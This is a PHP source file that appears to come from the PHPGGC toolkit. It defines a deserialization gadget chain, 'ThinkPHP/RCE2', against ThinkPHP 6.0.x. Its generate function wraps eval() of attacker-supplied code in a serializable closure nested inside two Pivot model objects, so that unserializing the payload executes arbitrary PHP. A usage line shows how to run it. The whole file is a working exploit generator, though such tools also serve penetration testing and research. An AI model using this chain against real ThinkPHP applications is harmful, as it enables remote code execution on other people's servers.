<?php
/**
 * Created by PhpStorm.
 * User: wh1t3P1g
 * Date: 2018/8/24
 * Time: 13:38
 */

namespace GadgetChain\ThinkPHP;


class RCE2 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '6.0.x';
    public $vector = '__destruct';
    public $author = 'wh1t3p1g';
    public $informations = '
    	This chain is supposed to execute arbitrary php code
    	需要使用编码器，不可直接输出
    	./phpggc -u ThinkPHP/RCE2 "phpinfo();"
    ';

    public function generate(array $parameters)
    {
        $code = $parameters['code'];
        $func = function () use ($code) {eval($code);};
        $closure = new \Opis\Closure\SerializableClosure($func);
        $pivot1 = new \think\model\Pivot(null,$closure);
        $pivot2 = new \think\model\Pivot($pivot1,$closure);
        return $pivot2;
    }
}